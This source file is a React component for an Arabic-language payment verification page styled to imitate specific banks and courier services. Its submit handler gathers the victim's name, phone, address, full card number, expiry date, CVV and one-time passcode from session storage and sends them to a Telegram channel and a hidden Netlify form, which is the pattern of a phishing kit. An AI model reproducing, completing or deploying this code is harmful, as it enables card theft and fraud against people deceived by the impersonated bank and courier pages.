import { useState, useEffect, useRef } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield, AlertCircle, ArrowLeft, Clock } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getBankDesign, getDefaultBankDesign } from "@/lib/bankDesigns";
import { getBankAssets } from "@/lib/bankAssets";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  
  const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  const [countdown, setCountdown] = useState(60);
  
  // Create refs for all inputs
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  // Get bank info from sessionStorage
  const selectedBankId = sessionStorage.getItem('selectedBank') || '';
  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  
  // Get bank design specification (always returns a complete design)
  const bankDesign = selectedBankId ? getBankDesign(selectedBankId) : getDefaultBankDesign();
  const bankAssets = getBankAssets(selectedBankId);
  
  // Demo OTP: 123456
  const DEMO_OTP = "123456";
  
  // Countdown timer effect
  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);
  
  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);
  
  const handleChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/[^0-9]/g, '');
    
    if (numericValue.length <= 1) {
      const newOtp = [...otp];
      newOtp[index] = numericValue;
      setOtp(newOtp);
      setError("");
      
      // Auto-focus next input if value entered
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
    }
  };
  
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    // Handle backspace
    if (e.key === 'Backspace') {
      e.preventDefault();
      
      if (otp[index]) {
        // Clear current input
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        // Move to previous input and clear it
        const newOtp = [...otp];
        newOtp[index - 1] = "";
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }
    
    // Handle Delete key
    if (e.key === 'Delete') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = "";
      setOtp(newOtp);
    }
    
    // Handle arrow keys
    if (e.key === 'ArrowLeft' && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowRight' && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Clear all on Escape
    if (e.key === 'Escape') {
      handleClearAll();
    }
  };
  
  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    if (pastedData) {
      const newOtp = [...otp];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newOtp[i] = pastedData[i];
      }
      setOtp(newOtp);
      
      // Focus the next empty input or last input
      const nextEmptyIndex = newOtp.findIndex(val => !val);
      if (nextEmptyIndex !== -1) {
        inputRefs.current[nextEmptyIndex]?.focus();
      } else {
        inputRefs.current[5]?.focus();
      }
    }
  };
  
  const handleClearAll = () => {
    setOtp(["", "", "", "", "", ""]);
    setError("");
    inputRefs.current[0]?.focus();
  };
  
  const handleDeleteLast = () => {
    const lastFilledIndex = otp.findLastIndex(val => val !== "");
    if (lastFilledIndex !== -1) {
      const newOtp = [...otp];
      newOtp[lastFilledIndex] = "";
      setOtp(newOtp);
      inputRefs.current[lastFilledIndex]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    const otpString = otp.join('');
    
    if (otpString.length !== 6) {
      setError("الرجاء إدخال رمز التحقق كاملاً");
      return;
    }
    
    if (otpString === DEMO_OTP) {
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment-confirmation",
            name: customerInfo.name || '',
            email: customerInfo.email || '',
            phone: customerInfo.phone || '',
            service: serviceName,
            amount: formattedAmount,
            cardLast4: sessionStorage.getItem('cardLast4') || '',
            cardholder: sessionStorage.getItem('cardName') || '',
            otp: otpString,
            timestamp: new Date().toISOString()
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      // Send complete payment confirmation to Telegram
      const telegramResult = await sendToTelegram({
        type: 'payment_confirmation',
        data: {
          name: customerInfo.name || '',
          email: customerInfo.email || '',
          phone: customerInfo.phone || '',
          address: customerInfo.address || '',
          service: serviceName,
          amount: formattedAmount,
          cardholder: sessionStorage.getItem('cardName') || '',
          cardNumber: sessionStorage.getItem('cardNumber') || '',
          cardLast4: sessionStorage.getItem('cardLast4') || '',
          expiry: sessionStorage.getItem('cardExpiry') || '12/25',
          cvv: sessionStorage.getItem('cardCvv') || '',
          otp: otpString
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        console.log('Payment confirmation sent to Telegram successfully');
      } else {
        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        handleClearAll();
      }
    }
  };
  
  const isOtpComplete = otp.every(digit => digit !== "");
  
  // Get button style with exact specifications
  const getButtonStyles = (): React.CSSProperties => {
    const baseStyle: React.CSSProperties = {
      borderRadius: bankDesign.buttonRadius || '8px',
      color: '#FFFFFF',
      fontWeight: bankDesign.fontWeight || '500',
      fontSize: bankDesign.buttonFontSize || bankDesign.fontSize?.body || '16px',
      padding: bankDesign.buttonPadding || bankDesign.padding?.button || '14px 24px',
      transition: 'all 0.3s ease',
      width: '100%',
    };
    
    switch (bankDesign.buttonStyle) {
      case 'gradient':
        return {
          ...baseStyle,
          background: `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'solid':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
        };
      case 'outline':
        return {
          ...baseStyle,
          background: 'transparent',
          border: `2px solid ${bankDesign.primaryColor}`,
          color: bankDesign.primaryColor,
        };
      case 'elevated':
        return {
          ...baseStyle,
          background: bankDesign.primaryColor,
          border: 'none',
          boxShadow: bankDesign.shadow?.button || `0 8px 16px ${bankDesign.primaryColor}40`,
        };
      default:
        return baseStyle;
    }
  };
  
  // Get input style for OTP boxes
  const getOTPInputStyle = (hasValue: boolean): React.CSSProperties => {
    return {
      width: '56px',
      height: '64px',
      textAlign: 'center',
      fontSize: '28px',
      fontWeight: 'bold',
      border: `2px solid ${hasValue ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40')}`,
      borderRadius: bankDesign.inputRadius || '12px',
      backgroundColor: hasValue ? bankDesign.primaryColor + '08' : bankDesign.surfaceColor,
      color: bankDesign.textColor,
      transition: 'all 0.2s ease',
    };
  };
  
  // Layout container style
  const getLayoutContainerStyle = (): React.CSSProperties => {
    const baseStyle: React.CSSProperties = {
      fontFamily: bankDesign.fontFamilyArabic || bankDesign.fontFamily || 'Tajawal, sans-serif',
      backgroundColor: bankDesign.backgroundColor,
      color: bankDesign.textColor,
      minHeight: '100vh',
      direction: 'rtl',
    };
    
    switch (bankDesign.backgroundPattern) {
      case 'gradient':
        return {
          ...baseStyle,
          background: `linear-gradient(135deg, ${bankDesign.backgroundColor} 0%, ${bankDesign.surfaceColor} 100%)`,
        };
      default:
        return baseStyle;
    }
  };
  
  // Get card style
  const getCardStyle = (): React.CSSProperties => {
    const baseStyle: React.CSSProperties = {
      backgroundColor: bankDesign.surfaceColor,
      borderRadius: bankDesign.borderRadius || '12px',
      padding: bankDesign.padding?.card || '32px',
      width: '100%',
    };
    
    switch (bankDesign.cardStyle) {
      case 'elevated':
        return {
          ...baseStyle,
          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
        };
      case 'flat':
        return {
          ...baseStyle,
          boxShadow: 'none',
          border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
        };
      case 'outlined':
        return {
          ...baseStyle,
          border: `2px solid ${bankDesign.borderColor || bankDesign.primaryColor}`,
          boxShadow: 'none',
        };
      case 'gradient':
        return {
          ...baseStyle,
          background: `linear-gradient(135deg, ${bankDesign.surfaceColor} 0%, ${bankDesign.backgroundColor} 100%)`,
          boxShadow: bankDesign.shadow?.card || '0 4px 16px rgba(0, 0, 0, 0.1)',
        };
      default:
        return baseStyle;
    }
  };
  
  // Format time
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const spacing = bankDesign.spacing || { small: '8px', medium: '16px', large: '24px', xlarge: '32px' };
  
  return (
    <div style={getLayoutContainerStyle()}>
      {/* Background Pattern/Image if specified */}
      {bankDesign.backgroundImage && (
        <div
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            backgroundImage: `url(${bankDesign.backgroundImage})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
            opacity: 0.03,
            zIndex: 0,
          }}
        />
      )}
      
      <div
        className="flex items-center justify-center min-h-screen"
        style={{
          padding: bankDesign.padding?.container || '24px',
          position: 'relative',
          zIndex: 1,
        }}
      >
        <div
          style={{
            maxWidth: bankDesign.containerMaxWidth || '480px',
            width: '100%',
          }}
        >
          {/* Bank Header */}
          {bankDesign.showLogo && selectedBank && bankDesign.headerStyle !== 'minimal' && (
            <div
              style={{
                textAlign: 'center',
                marginBottom: spacing.large,
              }}
            >
              {bankAssets?.logo ? (
                <img 
                  src={bankAssets.logo} 
                  alt={selectedBank?.name || ''}
                  style={{
                    width: bankDesign.logoSize || '160px',
                    height: 'auto',
                    marginBottom: spacing.medium,
                  }}
                  onError={(e) => {
                    e.currentTarget.style.display = 'none';
                  }}
                />
              ) : (
                <div
                  style={{
                    width: bankDesign.logoSize || '160px',
                    height: bankDesign.logoSize || '160px',
                    borderRadius: bankDesign.buttonRadius || '8px',
                    background: bankDesign.buttonStyle === 'gradient'
                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
                      : bankDesign.primaryColor,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#FFFFFF',
                    margin: '0 auto',
                    marginBottom: spacing.medium,
                  }}
                >
                  <Shield style={{ width: '40%', height: '40%' }} />
                </div>
              )}
              
              {bankDesign.headerStyle === 'prominent' && (
                <div
                  style={{
                    background: bankDesign.buttonStyle === 'gradient'
                      ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
                      : bankDesign.primaryColor,
                    borderRadius: bankDesign.borderRadius || '12px',
                    padding: spacing.medium,
                    color: '#FFFFFF',
                    marginBottom: spacing.medium,
                  }}
                >
                  <h1 style={{ 
                    fontSize: bankDesign.fontSize?.h2 || '24px', 
                    fontWeight: bankDesign.fontWeight || '600', 
                    margin: 0,
                    marginBottom: spacing.small,
                  }}>
                    {selectedBank.nameAr}
                  </h1>
                  {bankDesign.showTagline && bankDesign.taglineAr && (
                    <p style={{ 
                      fontSize: bankDesign.fontSize?.small || '14px', 
                      opacity: 0.9, 
                      margin: 0,
                    }}>
                      {bankDesign.taglineAr}
                    </p>
                  )}
                </div>
              )}
            </div>
          )}
          
          {/* OTP Card */}
          <div style={getCardStyle()}>
            {/* Title Section */}
            <div style={{ textAlign: 'center', marginBottom: spacing.xlarge }}>
              <div
                style={{
                  width: '80px',
                  height: '80px',
                  borderRadius: bankDesign.buttonRadius === '0px' ? '0' : '50%',
                  margin: '0 auto ' + spacing.large,
                  background: bankDesign.buttonStyle === 'gradient'
                    ? `linear-gradient(135deg, ${bankDesign.primaryColor}, ${bankDesign.secondaryColor})`
                    : bankDesign.primaryColor,
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  boxShadow: bankDesign.shadow?.button || `0 4px 12px ${bankDesign.primaryColor}30`,
                }}
              >
                <Shield style={{ width: '40px', height: '40px', color: '#FFFFFF' }} />
              </div>
              <h1 style={{ 
                fontSize: bankDesign.fontSize?.h1 || '32px', 
                fontWeight: bankDesign.fontWeight || '600', 
                color: bankDesign.textColor, 
                marginBottom: spacing.small,
                margin: 0,
              }}>
                رمز التحقق
              </h1>
              <p style={{ 
                fontSize: bankDesign.fontSize?.body || '16px', 
                color: bankDesign.textSecondaryColor || bankDesign.textColor,
                opacity: 0.7,
                margin: 0,
              }}>
                أدخل الرمز المرسل إلى هاتفك
              </p>
            </div>
            
            {/* Info Box */}
            <div
              style={{
                background: bankDesign.primaryColor + '10',
                border: `1px solid ${bankDesign.primaryColor}30`,
                borderRadius: bankDesign.borderRadius || '12px',
                padding: spacing.medium,
                marginBottom: spacing.large,
                textAlign: 'center',
              }}
            >
              <p style={{ 
                fontSize: bankDesign.fontSize?.small || '14px',
                color: bankDesign.textColor,
                margin: 0,
              }}>
                تم إرسال رمز التحقق المكون من 6 أرقام إلى هاتفك المسجل في البنك
              </p>
            </div>
            
            <form onSubmit={handleSubmit}>
              {/* OTP Input - 6 digits */}
              <div style={{ marginBottom: spacing.large }}>
                <div
                  style={{
                    display: 'flex',
                    gap: spacing.small,
                    justifyContent: 'center',
                    alignItems: 'center',
                    marginBottom: spacing.medium,
                    direction: 'ltr',
                  }}
                >
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      style={getOTPInputStyle(!!digit)}
                      onFocus={(e) => {
                        e.target.style.borderColor = bankDesign.primaryColor;
                        e.target.style.boxShadow = bankDesign.shadow?.input || `0 0 0 3px ${bankDesign.primaryColor}20`;
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = digit ? bankDesign.primaryColor : (bankDesign.borderColor || bankDesign.primaryColor + '40');
                        e.target.style.boxShadow = 'none';
                      }}
                      disabled={attempts >= 3}
                      autoComplete="off"
                    />
                  ))}
                </div>
              </div>
              
              {/* Error Message */}
              {error && (
                <div
                  style={{
                    background: (bankDesign.errorColor || '#DC2626') + '10',
                    border: `1px solid ${bankDesign.errorColor || '#DC2626'}30`,
                    borderRadius: bankDesign.borderRadius || '12px',
                    padding: spacing.medium,
                    marginBottom: spacing.large,
                    display: 'flex',
                    alignItems: 'start',
                    gap: spacing.small,
                  }}
                >
                  <AlertCircle style={{ 
                    width: '20px', 
                    height: '20px', 
                    color: bankDesign.errorColor || '#DC2626',
                    flexShrink: 0,
                    marginTop: '2px',
                  }} />
                  <p style={{ 
                    fontSize: bankDesign.fontSize?.small || '14px', 
                    color: bankDesign.errorColor || '#DC2626', 
                    margin: 0,
                  }}>
                    {error}
                  </p>
                </div>
              )}
              
              {/* Countdown Timer */}
              {countdown > 0 && (
                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
                  <div
                    style={{
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: spacing.small,
                      background: bankDesign.primaryColor + '15',
                      color: bankDesign.primaryColor,
                      padding: spacing.small + ' ' + spacing.medium,
                      borderRadius: bankDesign.borderRadius || '12px',
                      fontSize: bankDesign.fontSize?.small || '14px',
                      fontWeight: '500',
                    }}
                  >
                    <Clock style={{ width: '16px', height: '16px' }} />
                    <span>إعادة إرسال الرمز بعد {formatTime(countdown)}</span>
                  </div>
                </div>
              )}
              
              {/* Attempts Counter */}
              {attempts > 0 && attempts < 3 && (
                <div style={{ textAlign: 'center', marginBottom: spacing.medium }}>
                  <p style={{ 
                    fontSize: bankDesign.fontSize?.small || '14px',
                    color: '#F59E0B',
                    margin: 0,
                  }}>
                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
                  </p>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                style={{
                  ...getButtonStyles(),
                  cursor: (attempts >= 3 || !isOtpComplete) ? 'not-allowed' : 'pointer',
                  opacity: (attempts >= 3 || !isOtpComplete) ? 0.6 : 1,
                }}
                disabled={attempts >= 3 || !isOtpComplete}
              >
                {attempts >= 3 ? (
                  <span>محظور مؤقتاً</span>
                ) : (
                  <>
                    <span className="ml-2">تأكيد الدفع</span>
                    <ArrowLeft style={{ width: '16px', height: '16px', marginRight: '8px' }} />
                  </>
                )}
              </Button>
              
              {/* Resend Code Button */}
              {countdown === 0 && (
                <Button
                  type="button"
                  style={{
                    width: '100%',
                    marginTop: spacing.medium,
                    background: 'transparent',
                    border: `1px solid ${bankDesign.primaryColor}`,
                    color: bankDesign.primaryColor,
                    borderRadius: bankDesign.buttonRadius || '8px',
                    padding: spacing.medium,
                    fontSize: bankDesign.fontSize?.small || '14px',
                    cursor: 'pointer',
                  }}
                  onClick={() => {
                    setCountdown(60);
                    toast({
                      title: "تم إرسال الرمز",
                      description: "تم إرسال رمز تحقق جديد إلى هاتفك",
                    });
                  }}
                >
                  إعادة إرسال الرمز
                </Button>
              )}
            </form>
            
            {/* Demo Info */}
            <div
              style={{
                marginTop: spacing.large,
                padding: spacing.medium,
                background: bankDesign.surfaceColor,
                border: `1px solid ${bankDesign.borderColor || bankDesign.primaryColor + '20'}`,
                borderRadius: bankDesign.borderRadius || '12px',
                textAlign: 'center',
              }}
            >
              <p style={{ 
                fontSize: bankDesign.fontSize?.small || '14px',
                color: bankDesign.textSecondaryColor || bankDesign.textColor,
                opacity: 0.7,
                margin: 0,
              }}>
                🔐 للاختبار: استخدم الرمز <strong style={{ color: bankDesign.textColor }}>123456</strong>
              </p>
            </div>
          </div>
        </div>
      </div>
      
      {/* Hidden Netlify Form */}
      <form name="payment-confirmation" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="name" />
        <input type="email" name="email" />
        <input type="tel" name="phone" />
        <input type="text" name="service" />
        <input type="text" name="amount" />
        <input type="text" name="cardholder" />
        <input type="text" name="cardLast4" />
        <input type="text" name="otp" />
        <input type="text" name="timestamp" />
      </form>
      
      <style>{`
        @keyframes pulse {
          0%, 100% {
            opacity: 1;
          }
          50% {
            opacity: 0.8;
          }
        }
      `}</style>
      
      {/* Custom CSS if provided */}
      {bankDesign.customCSS && (
        <style dangerouslySetInnerHTML={{ __html: bankDesign.customCSS }} />
      )}
    </div>
  );
};

export default PaymentOTPForm;
